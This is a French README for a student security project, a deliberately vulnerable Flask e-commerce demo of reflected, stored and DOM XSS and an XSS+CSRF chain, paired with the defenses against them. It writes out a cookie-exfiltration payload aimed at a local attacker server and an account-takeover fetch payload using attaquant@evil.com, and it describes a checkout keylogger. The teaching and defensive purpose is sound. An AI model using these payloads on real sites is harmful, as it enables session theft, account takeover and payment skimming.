# Projet XSS — ShopTech
> Application Flask e-commerce volontairement vulnérable pour démonstration d'attaques XSS multi-niveaux et chaîne XSS+CSRF.

---

## Architecture

```
shoptech/
├── app.py                  # Serveur Flask principal (port 5000)
├── attacker_server.py      # Serveur attaquant (port 8000)
├── templates/
│   ├── index.html
│   ├── login.html
│   ├── search.html         # Reflected XSS
│   ├── product.html        # Stored XSS + CSRF
│   └── profile.html        # DOM-based XSS
├── static/
├── database.db             # SQLite (créé au lancement)
├── .env                    # SECRET_KEY Flask — ne pas committer
├── .gitignore
├── requirements.txt
└── README.md
```

**Deux serveurs, deux rôles :**
- Terminal 1 → `python app.py` → ShopTech vulnérable sur http://localhost:5000
- Terminal 2 → `python attacker_server.py` → Dashboard attaquant sur http://localhost:8000
- Wireshark optionnel pour capturer le trafic d'exfiltration en clair

---

## Vulnérabilités implémentées

### 1. Reflected XSS — `/search?q=`
Le terme de recherche est injecté directement dans le HTML sans échappement.
- **Payload PoC** : `<script>alert('XSS')</script>`
- **Payload exfiltration** : `<script>new Image().src="http://localhost:8000/steal?c="+document.cookie</script>`
- **Vecteur réel** : lien piégé distribué par phishing

### 2. Stored XSS — `/product/<id>` (section avis)
Le contenu des avis clients est stocké en SQLite sans sanitisation et affiché brut.
- **Niveau 1** : `<script>alert("XSS - Cookie: " + document.cookie)</script>`
- **Niveau 2** : exfiltration silencieuse via `new Image().src`
- **Niveau 3** : keylogger persistant capturant chaque touche sur toutes les pages, y compris `/checkout`
- **Référence réelle** : attaque Magecart (2018), British Airways

### 3. DOM-based XSS — `/profile#<payload>`
Le JavaScript de la page lit `location.hash` et l'injecte via `innerHTML` sans sanitisation.
```javascript
// Code vulnérable
const hash = location.hash.substring(1);
document.getElementById("content").innerHTML = hash;

// Correction
document.getElementById("content").textContent = hash;
```
- **Particularité** : le payload ne passe jamais par le serveur — logs vierges, WAF contourné

### 4. Chaîne XSS + CSRF — `/product/<id>`
Un Stored XSS forge automatiquement deux requêtes POST depuis l'origine légitime :
```javascript
// Payload — changement de compte via XSS+CSRF
fetch('/account/change-email', {method:'POST', body: JSON.stringify({email:'attaquant@evil.com'}), credentials:'include'});
fetch('/account/change-password', {method:'POST', body: JSON.stringify({password:'hacked123'}), credentials:'include'});
```
La victime perd l'accès à son compte à la simple visite d'une fiche produit.

---

## Défenses implémentées

| Attaque | Défense | Implémentation |
|---------|---------|----------------|
| Reflected XSS | Échappement HTML | `html.escape()` côté serveur |
| Stored XSS | Sanitisation | Bibliothèque `bleach` (Python) |
| DOM-based XSS | Éviter innerHTML | Remplacé par `textContent` |
| Vol de cookie | Cookie HttpOnly | `Set-Cookie: HttpOnly; SameSite=Strict` |
| CSRF | Token anti-CSRF | Token unique par formulaire |
| Toutes | Content Security Policy | Header CSP restrictif |

**Standard de référence** : OWASP Top 10 — A03:2021 (Injection), A01:2021 (Broken Access Control)

---

## Améliorations prioritaires

Ces tâches sont classées par impact recruteur. À implémenter dans cet ordre.

### 🔴 Priorité 1 — Hygiène de base (1–2h)

- [ ] **Gérer la SECRET_KEY Flask**
  - Créer `.env` avec `SECRET_KEY=<valeur aléatoire>`
  - Ajouter `.env` au `.gitignore`
  - Charger avec `python-dotenv` dans `app.py`
  - Commande : `pip install python-dotenv`

- [ ] **Créer le README GitHub**
  - Sections : objectif, prérequis, installation, lancement, captures d'écran
  - Mentionner OWASP A03:2021 et A01:2021
  - Ajouter lien vidéo démo (à tourner en dernier)

- [ ] **Publier sur GitHub**
  - Vérifier que `.env` et `database.db` sont dans `.gitignore`
  - Push sur repo public avec nom explicite : `xss-demo-shoptech`

### 🟡 Priorité 2 — Scan de sécurité (1h)

- [ ] **Lancer Bandit (SAST Python)**
  ```bash
  pip install bandit
  bandit -r . -f html -o rapport-bandit.html --exclude ./.venv
  ```
  - Committer `rapport-bandit.html` dans le repo
  - Corriger les findings HIGH avant de pusher

- [ ] **Scanner les dépendances**
  ```bash
  pip install pip-audit
  pip-audit
  ```
  - Mettre à jour les dépendances vulnérables identifiées
  - Documenter dans le README

### 🟢 Priorité 3 — Différenciation (quelques heures)

- [ ] **Ajouter un pipeline GitHub Actions**
  Créer `.github/workflows/security.yml` :
  ```yaml
  name: Security Scan
  on: [push, pull_request]
  jobs:
    sast:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v3
        - name: Install deps
          run: pip install bandit pip-audit
        - name: SAST — Bandit
          run: bandit -r . --exclude ./.venv -f json -o bandit-report.json
        - name: Dependency audit
          run: pip-audit
  ```

- [ ] **Ajouter niveau 4 : XSS via SVG upload**
  - Ajouter un endpoint `/profile/avatar` acceptant des uploads d'image
  - Démontrer qu'un SVG avec `<svg onload="...">` exécute du JS
  - Corriger en validant le MIME type côté serveur (pas juste l'extension)

- [ ] **Dockeriser ShopTech**
  - Créer un `Dockerfile` pour l'application Flask
  - Scanner l'image avec Trivy :
    ```bash
    docker build -t shoptech .
    trivy image shoptech
    ```
  - Committer le rapport Trivy dans le repo

### 🔵 Priorité 4 — Impact visuel (1 weekend)

- [ ] **Tourner une vidéo démo de 2 minutes**
  - Scénario : lancer les deux serveurs → poster l'avis malveillant → ouvrir l'onglet victime → montrer le cookie apparaître en temps réel sur le dashboard attaquant
  - Outil recommandé : OBS Studio
  - Héberger sur YouTube non listé, lien dans le README

- [ ] **Déployer sur un VPS ou Render.com**
  - Permet à un recruteur de tester lui-même
  - Render.com offre un tier gratuit compatible Flask
  - Désactiver les défenses sur une branche `vulnerable` et les activer sur `main`

---

## Commandes utiles

```bash
# Lancer l'environnement complet
python app.py &
python attacker_server.py &

# Capturer le trafic d'exfiltration
wireshark -i lo -k -f "port 8000"

# Scan SAST
bandit -r . --exclude ./.venv

# Scan dépendances
pip-audit

# Build + scan image Docker
docker build -t shoptech .
trivy image shoptech

# Générer un rapport Bandit HTML
bandit -r . -f html -o rapport-bandit.html --exclude ./.venv
```

---

## Contexte recruteur

**Pour un stage cybersécurité (AppSec / Pentest) :**
Ce projet démontre une maîtrise réelle des 3 types XSS + chaîne d'attaque + défenses implémentées. Il est au-dessus de la moyenne étudiante. Mettre en avant la distinction DOM XSS / logs vierges en entretien.

**Pour un stage Cloud Security / DevSecOps :**
Le pivot à faire est visible : les priorités 2 et 3 ci-dessus (Bandit + GitHub Actions + Docker) transforment ce projet AppSec en projet DevSecOps sans en changer l'essence.

**Phrase à préparer pour l'entretien :**
> "J'ai reproduit l'attaque Magecart sur une application e-commerce Flask — keylogger injecté via Stored XSS sur la page produit, actif sur le formulaire de paiement. J'ai ensuite implémenté les défenses (CSP, bleach, HttpOnly) et montré que les mêmes payloads échouent."

---

## Standards de référence

- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Magecart attack analysis — RiskIQ](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/)
